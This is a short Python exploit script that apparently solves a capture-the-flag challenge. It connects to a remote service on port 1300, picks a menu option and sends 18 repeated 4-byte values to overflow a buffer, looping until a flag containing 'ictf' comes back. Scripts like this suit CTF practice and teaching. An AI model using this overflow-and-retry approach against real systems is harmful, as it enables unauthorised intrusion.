import socket
from telnetlib import Telnet
import sys
from struct import pack
import time
TIMEOUT = 1
stdout = sys.stdout.buffer.write
nop = b'\x90'
num = pack("<I", 0x61626364)
host = 'spclr.ch'
port = 1300
while True:
    try:
        sock = socket.socket()
        sock.connect((host,port))
        buf = sock.recv(1024)
        #print(buf)
        payload = b'\x31'+b'\x00'+ num*18
        #stdout(payload)
        sock.send(b'\x31'+b'\n')
        buf = sock.recv(1024)
        #print(buf)
        sock.send(num*18+b'\n')
        buf = sock.recv(1024)
        #print(buf)
        buf = sock.recv(1024).split(b'\n')
        if 'ictf' in buf[1].decode():
            print('flag is: {}'.format(buf[1].decode()))
            sock.close()
            break
    except Exception as e:
        print('exception: {}'.format(e))
        sock.close()
        print('sleeping for {}s...'.format(TIMEOUT))
        time.sleep(TIMEOUT)
